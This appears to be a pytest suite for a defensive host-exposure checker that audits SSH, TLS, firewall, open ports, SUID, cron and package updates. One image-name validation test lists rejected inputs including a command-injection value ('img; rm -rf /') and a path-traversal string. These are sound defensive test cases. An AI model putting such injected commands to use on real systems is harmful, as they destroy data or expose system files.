"""
Tests for exposure_checker.py

Run with:  pytest -v
"""
import json
import os
import shutil
import stat
import subprocess
import sys
import textwrap
import unittest.mock as mock

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
import exposure_checker as ec


# ── Test double ───────────────────────────────────────────────────────────────

class FakeReporter:
    """Captures reporter calls without printing anything."""

    def __init__(self):
        self.findings = []   # list of dicts
        self.errors   = []
        self.oks      = []
        self.infos    = []
        self._data    = {"checks": []}

    def begin(self, *a, **kw):  pass
    def end(self, *a, **kw):    pass

    def finding(self, severity, label, why, fix, **extra):
        self.findings.append({"severity": severity, "label": label,
                               "why": why, "fix": fix, **extra})

    def ok(self, msg):      self.oks.append(msg)
    def info(self, msg):    self.infos.append(msg)
    def error(self, msg):   self.errors.append(msg)
    def dump_json(self):    pass

    @property
    def json_mode(self):    return True  # suppress all print() calls in checks


# ── _Reporter ─────────────────────────────────────────────────────────────────

class TestReporter:
    def test_human_mode_finding_fields(self, capsys):
        r = ec._Reporter(json_mode=False)
        r.begin("TEST CHECK", "sub")
        r.finding("HIGH", "label", "why text", "fix text")
        out = capsys.readouterr().out
        assert "[HIGH]" in out
        assert "why text" in out
        assert "fix text" in out

    def test_json_mode_suppresses_print(self, capsys):
        r = ec._Reporter(json_mode=True)
        r.begin("X")
        r.finding("HIGH", "lbl", "why", "fix")
        r.ok("all good")
        assert capsys.readouterr().out == ""

    def test_json_mode_dump_structure(self, capsys):
        r = ec._Reporter(json_mode=True)
        r.begin("MY CHECK", "sub here")
        r.finding("CRITICAL", "lbl", "why", "fix", port=22)
        r.dump_json()
        data = json.loads(capsys.readouterr().out)
        assert "timestamp" in data
        check = data["checks"][0]
        assert check["check"] == "MY CHECK"
        assert check["subtitle"] == "sub here"
        assert check["findings"][0]["severity"] == "CRITICAL"
        assert check["findings"][0]["port"] == 22

    def test_error_stored_in_json(self, capsys):
        r = ec._Reporter(json_mode=True)
        r.begin("X")
        r.error("something broke")
        r.dump_json()
        data = json.loads(capsys.readouterr().out)
        assert data["checks"][0]["error"] == "something broke"


# ── Helpers ───────────────────────────────────────────────────────────────────

class TestParseSshdConfig:
    def test_reads_values(self, tmp_path):
        cfg = tmp_path / "sshd_config"
        cfg.write_text("PasswordAuthentication yes\nPermitRootLogin no\n")
        settings, err = ec._parse_sshd_config(str(cfg))
        assert err is None
        assert settings["passwordauthentication"] == "yes"
        assert settings["permitrootlogin"] == "no"

    def test_first_occurrence_wins(self, tmp_path):
        cfg = tmp_path / "sshd_config"
        cfg.write_text("PasswordAuthentication yes\nPasswordAuthentication no\n")
        settings, _ = ec._parse_sshd_config(str(cfg))
        assert settings["passwordauthentication"] == "yes"

    def test_comments_and_blank_lines_ignored(self, tmp_path):
        cfg = tmp_path / "sshd_config"
        cfg.write_text("# comment\n\nPermitRootLogin no\n")
        settings, err = ec._parse_sshd_config(str(cfg))
        assert err is None
        assert "permitrootlogin" in settings

    def test_file_not_found(self):
        settings, err = ec._parse_sshd_config("/nonexistent/sshd_config")
        assert settings is None
        assert err is not None

    @pytest.mark.skipif(hasattr(os, "geteuid") and os.geteuid() == 0,
                        reason="root bypasses file permissions")
    def test_permission_error(self, tmp_path):
        cfg = tmp_path / "sshd_config"
        cfg.write_text("X yes\n")
        cfg.chmod(0o000)
        try:
            settings, err = ec._parse_sshd_config(str(cfg))
            assert settings is None
            assert "permission" in err.lower()
        finally:
            cfg.chmod(0o644)  # restore so tmp_path cleanup works


class TestParseGraceTime:
    def test_seconds(self):   assert ec._parse_grace_time("120") == 120
    def test_minutes(self):   assert ec._parse_grace_time("2m")  == 120
    def test_hours(self):     assert ec._parse_grace_time("1h")  == 3600
    def test_bad_input(self): assert ec._parse_grace_time("bad") is None


class TestParseTlsTarget:
    def test_host_only(self):
        h, p, e = ec._parse_tls_target("example.com")
        assert h == "example.com" and p == 443 and e is None

    def test_host_port(self):
        h, p, e = ec._parse_tls_target("example.com:8443")
        assert h == "example.com" and p == 8443

    def test_https_scheme_stripped(self):
        h, p, e = ec._parse_tls_target("https://example.com")
        assert h == "example.com" and p == 443 and e is None

    def test_path_stripped(self):
        h, p, e = ec._parse_tls_target("https://example.com/some/path")
        assert h == "example.com" and p == 443 and e is None

    def test_invalid_port(self):
        _, _, e = ec._parse_tls_target("localhost:99999")
        assert e is not None and "99999" in e

    def test_empty_host(self):
        _, _, e = ec._parse_tls_target("")
        assert e is not None

    def test_unresolvable_host(self):
        _, _, e = ec._parse_tls_target("definitely.not.real.invalid.example")
        assert e is not None


class TestValidateImageName:
    def test_valid(self):
        for n in ["nginx:latest", "registry.io/team/app:1.2.3", "ubuntu"]:
            assert ec._validate_image_name(n), f"should allow: {n!r}"

    def test_invalid(self):
        for n in ["../etc/passwd", "img; rm -rf /", "", "a" * 513, "img name"]:
            assert not ec._validate_image_name(n), f"should reject: {n!r}"


class TestParseSsAddr:
    def test_ipv4(self):
        assert ec._parse_ss_addr("0.0.0.0:22") == ("0.0.0.0", 22)

    def test_ipv6(self):
        assert ec._parse_ss_addr("[::]:80") == ("::", 80)

    def test_localhost(self):
        assert ec._parse_ss_addr("127.0.0.1:5432") == ("127.0.0.1", 5432)

    def test_bad_input(self):
        assert ec._parse_ss_addr("notanaddr") == (None, None)


# ── audit_ssh ─────────────────────────────────────────────────────────────────

class TestAuditSsh:
    def test_weak_settings_flagged(self, tmp_path):
        cfg = tmp_path / "sshd_config"
        cfg.write_text("PasswordAuthentication yes\nPermitEmptyPasswords yes\nPermitRootLogin yes\n")
        r = FakeReporter()
        ec.audit_ssh(r, str(cfg))
        sevs = {f["severity"] for f in r.findings}
        assert "CRITICAL" in sevs  # PermitEmptyPasswords + PermitRootLogin
        assert "HIGH" in sevs      # PasswordAuthentication

    def test_hardened_config_no_findings(self, tmp_path):
        cfg = tmp_path / "sshd_config"
        cfg.write_text(textwrap.dedent("""\
            PasswordAuthentication no
            PermitRootLogin no
            PermitEmptyPasswords no
            X11Forwarding no
            StrictModes yes
        """))
        r = FakeReporter()
        ec.audit_ssh(r, str(cfg))
        assert r.findings == []
        assert r.oks

    def test_max_auth_tries_flagged(self, tmp_path):
        cfg = tmp_path / "sshd_config"
        cfg.write_text("PasswordAuthentication no\nMaxAuthTries 10\n")
        r = FakeReporter()
        ec.audit_ssh(r, str(cfg))
        labels = [f["label"] for f in r.findings]
        assert any("MaxAuthTries" in l for l in labels)

    def test_login_grace_time_flagged(self, tmp_path):
        cfg = tmp_path / "sshd_config"
        cfg.write_text("PasswordAuthentication no\nLoginGraceTime 120\n")
        r = FakeReporter()
        ec.audit_ssh(r, str(cfg))
        labels = [f["label"] for f in r.findings]
        assert any("LoginGraceTime" in l for l in labels)

    def test_missing_file_produces_error(self):
        r = FakeReporter()
        ec.audit_ssh(r, "/nonexistent/sshd_config")
        assert r.errors

    def test_password_auth_absent_flagged_as_default(self, tmp_path):
        # OpenSSH default for PasswordAuthentication is yes — should still flag
        cfg = tmp_path / "sshd_config"
        cfg.write_text("PermitRootLogin no\n")   # no PasswordAuthentication line
        r = FakeReporter()
        ec.audit_ssh(r, str(cfg))
        labels = [f["label"] for f in r.findings]
        assert any("PasswordAuthentication" in l for l in labels)


# ── check_tls ─────────────────────────────────────────────────────────────────

class TestCheckTls:
    def test_invalid_port_error(self):
        r = FakeReporter()
        ec.check_tls(r, "localhost:99999")
        assert r.errors

    def test_unresolvable_host_error(self):
        r = FakeReporter()
        ec.check_tls(r, "not.a.real.host.invalid.example")
        assert r.errors

    def test_missing_cryptography(self, monkeypatch):
        monkeypatch.setattr(ec.checks.security, "_CRYPTO_OK", False)
        r = FakeReporter()
        ec.check_tls(r, "example.com")
        assert r.errors
        assert any("cryptography" in e for e in r.errors)

    def test_live_cert_no_error(self):
        # Skipped if network is unavailable
        pytest.importorskip("cryptography")
        r = FakeReporter()
        try:
            ec.check_tls(r, "google.com")
        except Exception:
            pytest.skip("Network unavailable")
        assert not r.errors


# ── scan_trivy ────────────────────────────────────────────────────────────────

class TestScanTrivy:
    def test_trivy_not_installed(self, monkeypatch):
        monkeypatch.setattr(ec.shutil, "which", lambda _: None)
        r = FakeReporter()
        ec.scan_trivy(r, "ALL")
        assert r.errors
        assert any("Trivy" in e for e in r.errors)

    def test_invalid_image_name(self, monkeypatch):
        monkeypatch.setattr(ec.shutil, "which", lambda cmd: "/usr/bin/trivy" if cmd == "trivy" else None)
        r = FakeReporter()
        ec.scan_trivy(r, "bad image name!")
        assert r.errors

    def test_parses_trivy_json(self, monkeypatch):
        payload = {
            "SchemaVersion": 2,
            "Results": [{
                "Target": "nginx",
                "Vulnerabilities": [
                    {"VulnerabilityID": "CVE-2023-0001", "PkgName": "libssl",
                     "InstalledVersion": "1.0", "FixedVersion": "1.1",
                     "Severity": "CRITICAL"},
                    {"VulnerabilityID": "CVE-2023-0002", "PkgName": "curl",
                     "InstalledVersion": "7.0", "FixedVersion": "",
                     "Severity": "HIGH"},
                ],
            }],
        }
        monkeypatch.setattr(ec.shutil, "which", lambda _: "/usr/bin/trivy")
        proc = mock.MagicMock()
        proc.stdout = json.dumps(payload)
        proc.returncode = 0
        monkeypatch.setattr(ec.subprocess, "run", lambda *a, **kw: proc)
        r = FakeReporter()
        ec._trivy_scan_one(r, "/usr/bin/trivy", "nginx:latest")
        assert r.findings
        assert r.findings[0]["severity"] == "CRITICAL"
        assert r.findings[0]["total_cves"] == 2

    def test_clean_image_no_findings(self, monkeypatch):
        payload = {"SchemaVersion": 2, "Results": []}
        monkeypatch.setattr(ec.shutil, "which", lambda _: "/usr/bin/trivy")
        proc = mock.MagicMock()
        proc.stdout = json.dumps(payload)
        monkeypatch.setattr(ec.subprocess, "run", lambda *a, **kw: proc)
        r = FakeReporter()
        ec._trivy_scan_one(r, "/usr/bin/trivy", "scratch")
        assert r.findings == []


# ── check_firewall ────────────────────────────────────────────────────────────

class TestCheckFirewall:
    def _run(self, monkeypatch, which_map, run_returns):
        monkeypatch.setattr(ec.shutil, "which", lambda cmd: which_map.get(cmd))
        calls = iter(run_returns)
        monkeypatch.setattr(ec.subprocess, "run", lambda *a, **kw: next(calls))
        r = FakeReporter()
        ec.check_firewall(r)
        return r

    def test_ufw_active(self, monkeypatch):
        proc = mock.MagicMock(stdout="Status: active\n")
        r = self._run(monkeypatch, {"ufw": "/usr/sbin/ufw"}, [proc])
        assert r.oks and not r.findings

    def test_ufw_inactive_flagged(self, monkeypatch):
        proc = mock.MagicMock(stdout="Status: inactive\n")
        r = self._run(monkeypatch, {"ufw": "/usr/sbin/ufw"}, [proc])
        assert r.findings and r.findings[0]["severity"] == "HIGH"

    def test_no_firewall_flagged(self, monkeypatch):
        monkeypatch.setattr(ec.shutil, "which", lambda _: None)
        r = FakeReporter()
        ec.check_firewall(r)
        assert r.findings and r.findings[0]["severity"] == "HIGH"


# ── check_listeners ───────────────────────────────────────────────────────────

class TestCheckListeners:
    _SS_HEADER = "Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process\n"

    def test_external_risky_port_flagged(self, monkeypatch):
        ss_out = (
            self._SS_HEADER
            + 'tcp LISTEN 0 128 0.0.0.0:6379 0.0.0.0:* users:(("redis-server",pid=1,fd=6))\n'
        )
        monkeypatch.setattr(ec.shutil, "which", lambda cmd: "/usr/bin/ss" if cmd == "ss" else None)
        proc = mock.MagicMock(stdout=ss_out)
        monkeypatch.setattr(ec.subprocess, "run", lambda *a, **kw: proc)
        r = FakeReporter()
        ec.check_listeners(r)
        assert any(f["severity"] == "CRITICAL" for f in r.findings)

    def test_localhost_only_port_ignored(self, monkeypatch):
        ss_out = (
            self._SS_HEADER
            + "tcp LISTEN 0 128 127.0.0.1:5432 0.0.0.0:*\n"
        )
        monkeypatch.setattr(ec.shutil, "which", lambda cmd: "/usr/bin/ss" if cmd == "ss" else None)
        proc = mock.MagicMock(stdout=ss_out)
        monkeypatch.setattr(ec.subprocess, "run", lambda *a, **kw: proc)
        r = FakeReporter()
        ec.check_listeners(r)
        assert r.findings == []

    def test_ss_not_found(self, monkeypatch):
        monkeypatch.setattr(ec.shutil, "which", lambda _: None)
        r = FakeReporter()
        ec.check_listeners(r)
        assert r.errors


# ── check_world_writable ──────────────────────────────────────────────────────

class TestCheckWorldWritable:
    def test_world_writable_file_found(self, tmp_path, monkeypatch):
        bad = tmp_path / "badfile"
        bad.write_text("x")
        bad.chmod(0o777)
        monkeypatch.setattr(ec.checks.security, "_WORLD_WRITABLE_DIRS", [str(tmp_path)])
        r = FakeReporter()
        ec.check_world_writable(r)
        assert r.findings
        assert r.findings[0]["severity"] == "HIGH"

    def test_no_world_writable_files(self, tmp_path, monkeypatch):
        safe = tmp_path / "safefile"
        safe.write_text("x")
        safe.chmod(0o644)
        monkeypatch.setattr(ec.checks.security, "_WORLD_WRITABLE_DIRS", [str(tmp_path)])
        r = FakeReporter()
        ec.check_world_writable(r)
        assert r.findings == []
        assert r.oks


# ── check_suid ────────────────────────────────────────────────────────────────

class TestCheckSuid:
    def test_suid_binary_found(self, tmp_path, monkeypatch):
        # Verify detection works regardless of severity classification.
        f = tmp_path / "mybin"
        f.write_text("x")
        f.chmod(0o4755)
        monkeypatch.setattr(ec.checks.security, "_SUID_SEARCH_DIRS", [str(tmp_path)])
        r = FakeReporter()
        ec.check_suid(r)
        assert r.findings

    def test_suid_in_normal_dir_info(self, tmp_path, monkeypatch):
        # Clear suspect roots so tmp_path is treated as a normal location.
        f = tmp_path / "mybin"
        f.write_text("x")
        f.chmod(0o4755)
        monkeypatch.setattr(ec.checks.security, "_SUID_SEARCH_DIRS", [str(tmp_path)])
        monkeypatch.setattr(ec.checks.security, "_SUID_SUSPECT_ROOTS", frozenset())
        r = FakeReporter()
        ec.check_suid(r)
        assert r.findings
        assert r.findings[0]["severity"] == "INFO"

    def test_suid_in_suspect_dir_critical(self, tmp_path, monkeypatch):
        # Set suspect roots to include the top-level dir that tmp_path lives under.
        f = tmp_path / "planted"
        f.write_text("x")
        f.chmod(0o4755)
        top = "/" + str(tmp_path).lstrip("/").split("/")[0]  # e.g. "/tmp"
        monkeypatch.setattr(ec.checks.security, "_SUID_SEARCH_DIRS", [str(tmp_path)])
        monkeypatch.setattr(ec.checks.security, "_SUID_SUSPECT_ROOTS", frozenset({top}))
        r = FakeReporter()
        ec.check_suid(r)
        assert r.findings
        assert r.findings[0]["severity"] == "CRITICAL"


# ── check_cron ────────────────────────────────────────────────────────────────

class TestCheckCron:
    def test_world_writable_script_flagged(self, tmp_path):
        script = tmp_path / "backup.sh"
        script.write_text("#!/bin/bash\necho hi\n")
        script.chmod(0o777)

        crontab = tmp_path / "crontab"
        crontab.write_text(f"0 2 * * * root {script}\n")

        r = FakeReporter()
        ec.checks.security._CRON_FILES = [str(crontab)]
        ec.checks.security._CRON_DIRS  = []
        ec.checks.security._CRON_ROOT_SPOOL = "/nonexistent"
        ec.check_cron(r)
        assert r.findings
        assert r.findings[0]["severity"] == "CRITICAL"

    def test_safe_script_no_findings(self, tmp_path):
        script = tmp_path / "safe.sh"
        script.write_text("#!/bin/bash\necho hi\n")
        script.chmod(0o755)

        crontab = tmp_path / "crontab"
        crontab.write_text(f"0 2 * * * root {script}\n")

        r = FakeReporter()
        ec.checks.security._CRON_FILES = [str(crontab)]
        ec.checks.security._CRON_DIRS  = []
        ec.checks.security._CRON_ROOT_SPOOL = "/nonexistent"
        ec.check_cron(r)
        assert r.findings == []
        assert r.oks

    def test_no_readable_cron_files(self):
        r = FakeReporter()
        ec.checks.security._CRON_FILES = ["/nonexistent/crontab"]
        ec.checks.security._CRON_DIRS  = []
        ec.checks.security._CRON_ROOT_SPOOL = "/nonexistent"
        ec.check_cron(r)
        assert r.oks   # "No readable cron files"


# ── run_port_scan ─────────────────────────────────────────────────────────────

# ── _Reporter.write_to / findings_at_or_above ─────────────────────────────────

class TestReporterOutputHelpers:
    def _reporter_with_findings(self):
        r = ec._Reporter(json_mode=True)
        r.begin("T")
        r.finding("CRITICAL", "c", "w", "f")
        r.finding("HIGH",     "h", "w", "f")
        r.finding("MEDIUM",   "m", "w", "f")
        r.finding("INFO",     "i", "w", "f")
        return r

    def test_write_to_creates_valid_json(self, tmp_path):
        r = self._reporter_with_findings()
        out = str(tmp_path / "report.json")
        err = r.write_to(out)
        assert err is None
        data = json.loads(open(out).read())
        assert "checks" in data and "timestamp" in data

    def test_write_to_bad_path_returns_error(self):
        r = ec._Reporter(json_mode=True)
        err = r.write_to("/nonexistent/dir/report.json")
        assert err is not None

    def test_fail_on_critical_only_catches_critical(self):
        r = self._reporter_with_findings()
        hits = r.findings_at_or_above("critical")
        assert len(hits) == 1
        assert hits[0]["severity"] == "CRITICAL"

    def test_fail_on_high_catches_critical_and_high(self):
        r = self._reporter_with_findings()
        hits = r.findings_at_or_above("high")
        assert len(hits) == 2
        assert {f["severity"] for f in hits} == {"CRITICAL", "HIGH"}

    def test_fail_on_medium_excludes_info(self):
        r = self._reporter_with_findings()
        hits = r.findings_at_or_above("medium")
        assert len(hits) == 3
        assert all(f["severity"] != "INFO" for f in hits)

    def test_fail_on_info_catches_all(self):
        r = self._reporter_with_findings()
        hits = r.findings_at_or_above("info")
        assert len(hits) == 4

    def test_no_findings_returns_empty(self):
        r = ec._Reporter(json_mode=True)
        r.begin("empty")
        assert r.findings_at_or_above("critical") == []


# ── run_port_scan ─────────────────────────────────────────────────────────────

class TestRunPortScan:
    def test_open_port_reported(self, monkeypatch):
        monkeypatch.setattr(ec.checks.portscan, "scan", lambda ip, ports, timeout, workers=100: [6379])
        r = FakeReporter()
        ec.run_port_scan(r, "127.0.0.1", "127.0.0.1", 1.0)
        assert r.findings
        assert r.findings[0]["severity"] == "CRITICAL"
        assert r.findings[0]["port"] == 6379

    def test_no_open_ports(self, monkeypatch):
        monkeypatch.setattr(ec.checks.portscan, "scan", lambda ip, ports, timeout, workers=100: [])
        r = FakeReporter()
        ec.run_port_scan(r, "127.0.0.1", "127.0.0.1", 1.0)
        assert r.findings == []
        assert r.oks


# ── diff ──────────────────────────────────────────────────────────────────────

def _make_report(checks, timestamp="2026-01-01T00:00:00+00:00"):
    return {"timestamp": timestamp, "checks": checks}


def _make_check(name, findings):
    return {"check": name, "findings": [
        {"label": l, "severity": s} for l, s in findings
    ]}


class TestLoadReport:
    def test_valid_file(self, tmp_path):
        p = tmp_path / "r.json"
        data = _make_report([])
        p.write_text(json.dumps(data))
        result, err = ec._load_report(str(p))
        assert err is None
        assert result["timestamp"] == "2026-01-01T00:00:00+00:00"

    def test_missing_file(self, tmp_path):
        _, err = ec._load_report(str(tmp_path / "nope.json"))
        assert err and "file not found" in err

    def test_bad_json(self, tmp_path):
        p = tmp_path / "bad.json"
        p.write_text("not json {{{")
        _, err = ec._load_report(str(p))
        assert err and "invalid JSON" in err

    def test_missing_checks_key(self, tmp_path):
        p = tmp_path / "r.json"
        p.write_text(json.dumps({"timestamp": "t"}))
        _, err = ec._load_report(str(p))
        assert err and "does not look like" in err

    def test_missing_timestamp_key(self, tmp_path):
        p = tmp_path / "r.json"
        p.write_text(json.dumps({"checks": []}))
        _, err = ec._load_report(str(p))
        assert err and "does not look like" in err


class TestDiffReports:
    def _before(self):
        return _make_report([
            _make_check("PORT SCAN", [("port 22 - SSH", "HIGH"), ("port 80 - HTTP", "MEDIUM")]),
            _make_check("SSH CONFIG AUDIT", [("PasswordAuthentication yes", "HIGH")]),
        ])

    def _after_new(self):
        return _make_report([
            _make_check("PORT SCAN", [("port 22 - SSH", "HIGH"), ("port 80 - HTTP", "MEDIUM"),
                                      ("port 6379 - Redis", "CRITICAL")]),
            _make_check("SSH CONFIG AUDIT", [("PasswordAuthentication yes", "HIGH")]),
        ])

    def _after_resolved(self):
        return _make_report([
            _make_check("PORT SCAN", [("port 80 - HTTP", "MEDIUM")]),
            _make_check("SSH CONFIG AUDIT", [("PasswordAuthentication yes", "HIGH")]),
        ])

    def _after_changed(self):
        return _make_report([
            _make_check("PORT SCAN", [("port 22 - SSH", "CRITICAL"), ("port 80 - HTTP", "MEDIUM")]),
            _make_check("SSH CONFIG AUDIT", [("PasswordAuthentication yes", "HIGH")]),
        ])

    def test_no_diff(self):
        b = self._before()
        diff = ec.diff_reports(b, b)
        assert diff == {"new": [], "resolved": [], "changed": []}

    def test_new_finding(self):
        diff = ec.diff_reports(self._before(), self._after_new())
        assert len(diff["new"]) == 1
        assert diff["new"][0] == ("PORT SCAN", "port 6379 - Redis", "CRITICAL")
        assert diff["resolved"] == []
        assert diff["changed"] == []

    def test_resolved_finding(self):
        diff = ec.diff_reports(self._before(), self._after_resolved())
        assert len(diff["resolved"]) == 1
        assert diff["resolved"][0] == ("PORT SCAN", "port 22 - SSH", "HIGH")
        assert diff["new"] == []
        assert diff["changed"] == []

    def test_changed_severity(self):
        diff = ec.diff_reports(self._before(), self._after_changed())
        assert len(diff["changed"]) == 1
        assert diff["changed"][0] == ("PORT SCAN", "port 22 - SSH", "HIGH", "CRITICAL")
        assert diff["new"] == []
        assert diff["resolved"] == []

    def test_empty_reports(self):
        b = _make_report([])
        diff = ec.diff_reports(b, b)
        assert diff == {"new": [], "resolved": [], "changed": []}

    def test_all_new(self):
        diff = ec.diff_reports(_make_report([]), self._before())
        assert len(diff["new"]) == 3
        assert diff["resolved"] == []

    def test_all_resolved(self):
        diff = ec.diff_reports(self._before(), _make_report([]))
        assert len(diff["resolved"]) == 3
        assert diff["new"] == []


class TestDiffMain:
    def _write(self, tmp_path, name, data):
        p = tmp_path / name
        p.write_text(json.dumps(data))
        return str(p)

    def test_no_changes_human(self, tmp_path, capsys):
        r = _make_report([_make_check("PORT SCAN", [("port 22 - SSH", "HIGH")])])
        bf = self._write(tmp_path, "before.json", r)
        af = self._write(tmp_path, "after.json", r)
        ec._diff_main([bf, af])
        out = capsys.readouterr().out
        assert "No changes" in out

    def test_new_finding_human(self, tmp_path, capsys):
        before = _make_report([_make_check("PORT SCAN", [("port 22 - SSH", "HIGH")])])
        after  = _make_report([_make_check("PORT SCAN", [("port 22 - SSH", "HIGH"),
                                                          ("port 6379 - Redis", "CRITICAL")])])
        bf = self._write(tmp_path, "b.json", before)
        af = self._write(tmp_path, "a.json", after)
        ec._diff_main([bf, af])
        out = capsys.readouterr().out
        assert "NEW (1)" in out
        assert "port 6379 - Redis" in out

    def test_json_output(self, tmp_path, capsys):
        before = _make_report([_make_check("PORT SCAN", [("port 22 - SSH", "HIGH")])])
        after  = _make_report([_make_check("PORT SCAN", [])])
        bf = self._write(tmp_path, "b.json", before)
        af = self._write(tmp_path, "a.json", after)
        ec._diff_main([bf, af, "--json"])
        out = json.loads(capsys.readouterr().out)
        assert out["resolved"][0]["label"] == "port 22 - SSH"
        assert out["new"] == []

    def test_fail_on_new_finding_exits(self, tmp_path):
        before = _make_report([])
        after  = _make_report([_make_check("PORT SCAN", [("port 6379 - Redis", "CRITICAL")])])
        bf = self._write(tmp_path, "b.json", before)
        af = self._write(tmp_path, "a.json", after)
        with pytest.raises(SystemExit) as exc:
            ec._diff_main([bf, af, "--fail-on", "high"])
        assert exc.value.code == 1

    def test_fail_on_below_threshold_no_exit(self, tmp_path):
        before = _make_report([])
        after  = _make_report([_make_check("PORT SCAN", [("port 80 - HTTP", "INFO")])])
        bf = self._write(tmp_path, "b.json", before)
        af = self._write(tmp_path, "a.json", after)
        ec._diff_main([bf, af, "--fail-on", "high"])  # should NOT raise

    def test_missing_before_file_exits(self, tmp_path):
        after = _make_report([])
        af = self._write(tmp_path, "a.json", after)
        with pytest.raises(SystemExit):
            ec._diff_main([str(tmp_path / "nope.json"), af])

    def test_missing_after_file_exits(self, tmp_path):
        before = _make_report([])
        bf = self._write(tmp_path, "b.json", before)
        with pytest.raises(SystemExit):
            ec._diff_main([bf, str(tmp_path / "nope.json")])


# ── baseline ──────────────────────────────────────────────────────────────────

class TestSaveBaseline:
    def test_creates_file_and_dirs(self, tmp_path):
        path = str(tmp_path / "sub" / "dir" / "baseline.json")
        data = _make_report([_make_check("PORT SCAN", [("port 22 - SSH", "HIGH")])])
        err = ec._save_baseline(path, data)
        assert err is None
        with open(path) as fh:
            loaded = json.load(fh)
        assert loaded["timestamp"] == data["timestamp"]

    def test_returns_error_on_bad_path(self):
        err = ec._save_baseline("/dev/null/cannot/create/this.json", {})
        assert err is not None


class TestMainBaseline:
    """Integration-level tests for --save-baseline / --diff-baseline in main()."""

    def _report(self, findings=None):
        checks = [_make_check("PORT SCAN", findings or [])]
        return _make_report(checks)

    def test_save_baseline_creates_file(self, tmp_path, monkeypatch, capsys):
        bl = str(tmp_path / "baseline.json")
        monkeypatch.setattr(ec.checks.portscan, "scan", lambda ip, ports, timeout, workers=100: [])
        monkeypatch.setattr(sys, "argv", ["ec", "--save-baseline", f"--baseline-file={bl}"])
        ec.main()
        assert os.path.exists(bl)
        out = capsys.readouterr().out
        assert "Baseline saved" in out

    def test_diff_baseline_no_changes(self, tmp_path, monkeypatch, capsys):
        bl = str(tmp_path / "baseline.json")
        data = _make_report([])
        with open(bl, "w") as fh:
            json.dump(data, fh)
        monkeypatch.setattr(ec.checks.portscan, "scan", lambda ip, ports, timeout, workers=100: [])
        monkeypatch.setattr(sys, "argv", ["ec", "--diff-baseline", f"--baseline-file={bl}"])
        ec.main()
        out = capsys.readouterr().out
        assert "No changes" in out

    def test_diff_baseline_new_finding(self, tmp_path, monkeypatch, capsys):
        bl = str(tmp_path / "baseline.json")
        with open(bl, "w") as fh:
            json.dump(_make_report([]), fh)
        monkeypatch.setattr(ec.checks.portscan, "scan", lambda ip, ports, timeout, workers=100: [6379])
        monkeypatch.setattr(sys, "argv", ["ec", "--diff-baseline", f"--baseline-file={bl}"])
        ec.main()
        out = capsys.readouterr().out
        assert "NEW" in out

    def test_diff_baseline_missing_baseline_prints_to_stderr(self, tmp_path, monkeypatch, capsys):
        bl = str(tmp_path / "nope.json")
        monkeypatch.setattr(ec.checks.portscan, "scan", lambda ip, ports, timeout, workers=100: [])
        monkeypatch.setattr(sys, "argv", ["ec", "--diff-baseline", f"--baseline-file={bl}"])
        ec.main()
        err = capsys.readouterr().err
        assert "--diff-baseline" in err

    def test_diff_baseline_fail_on_new_exits(self, tmp_path, monkeypatch):
        bl = str(tmp_path / "baseline.json")
        with open(bl, "w") as fh:
            json.dump(_make_report([]), fh)
        monkeypatch.setattr(ec.checks.portscan, "scan", lambda ip, ports, timeout, workers=100: [6379])
        monkeypatch.setattr(sys, "argv", [
            "ec", "--diff-baseline", f"--baseline-file={bl}", "--fail-on=critical",
        ])
        with pytest.raises(SystemExit) as exc:
            ec.main()
        assert exc.value.code == 1

    def test_diff_baseline_fail_on_no_new_findings_no_exit(self, tmp_path, monkeypatch):
        """--fail-on does not exit when there are no *new* findings."""
        bl = str(tmp_path / "baseline.json")
        monkeypatch.setattr(ec.checks.portscan, "scan", lambda ip, ports, timeout, workers=100: [6379])
        # Save baseline from the scan so the finding is already known.
        monkeypatch.setattr(sys, "argv", ["ec", "--save-baseline", f"--baseline-file={bl}"])
        ec.main()
        # Now re-scan with the same result — no new findings, --fail-on must not exit.
        monkeypatch.setattr(sys, "argv", [
            "ec", "--diff-baseline", f"--baseline-file={bl}", "--fail-on=critical",
        ])
        ec.main()  # no new findings → must not raise

    def test_diff_baseline_json_output(self, tmp_path, monkeypatch, capsys):
        bl = str(tmp_path / "baseline.json")
        with open(bl, "w") as fh:
            json.dump(_make_report([]), fh)
        monkeypatch.setattr(ec.checks.portscan, "scan", lambda ip, ports, timeout, workers=100: [6379])
        monkeypatch.setattr(sys, "argv", [
            "ec", "--diff-baseline", f"--baseline-file={bl}", "--json",
        ])
        ec.main()
        out = json.loads(capsys.readouterr().out)
        assert len(out["new"]) == 1
        assert out["new"][0]["severity"] == "CRITICAL"

    def test_save_and_diff_updates_baseline(self, tmp_path, monkeypatch, capsys):
        bl = str(tmp_path / "baseline.json")
        with open(bl, "w") as fh:
            json.dump(_make_report([]), fh)
        monkeypatch.setattr(ec.checks.portscan, "scan", lambda ip, ports, timeout, workers=100: [6379])
        monkeypatch.setattr(sys, "argv", [
            "ec", "--diff-baseline", "--save-baseline", f"--baseline-file={bl}",
        ])
        ec.main()
        # baseline should now contain the Redis finding
        with open(bl) as fh:
            saved = json.load(fh)
        all_findings = [
            f for c in saved["checks"] for f in c.get("findings", [])
        ]
        assert any("6379" in f["label"] for f in all_findings)


# ── check_packages ────────────────────────────────────────────────────────────

class TestParseAptUpgradeable:
    def test_security_line_detected(self):
        stdout = (
            "Listing... Done\n"
            "libssl3/focal-security 3.0.2-0ubuntu1.15 amd64 [upgradeable from: 3.0.2-0ubuntu1.14]\n"
            "curl/focal 7.81.0-1ubuntu1.16 amd64 [upgradeable from: 7.81.0-1ubuntu1.15]\n"
        )
        sec, other = ec._parse_apt_upgradeable(stdout)
        assert sec == ["libssl3"]
        assert other == ["curl"]

    def test_empty_output(self):
        sec, other = ec._parse_apt_upgradeable("Listing... Done\n")
        assert sec == [] and other == []

    def test_non_security_only(self):
        stdout = "vim/focal 2:8.2.3995-1ubuntu2 amd64 [upgradeable from: 2:8.2.3995-1ubuntu1]\n"
        sec, other = ec._parse_apt_upgradeable(stdout)
        assert sec == []
        assert other == ["vim"]

    def test_dash_security_variant(self):
        stdout = "openssl/bookworm-security 3.0.11-1~deb12u2 amd64 [upgradeable from: 3.0.9-1]\n"
        sec, other = ec._parse_apt_upgradeable(stdout)
        assert "openssl" in sec


class TestParseDnfCheckUpdate:
    def test_security_repo_detected(self):
        stdout = (
            "Last metadata expiration check: 0:01:02 ago.\n"
            "bash.x86_64          5.1.8-9.el9    security\n"
            "vim-common.x86_64    9.0.2048-1.el9 baseos\n"
        )
        sec, other = ec._parse_dnf_check_update(stdout)
        assert "bash.x86_64" in sec
        assert "vim-common.x86_64" in other

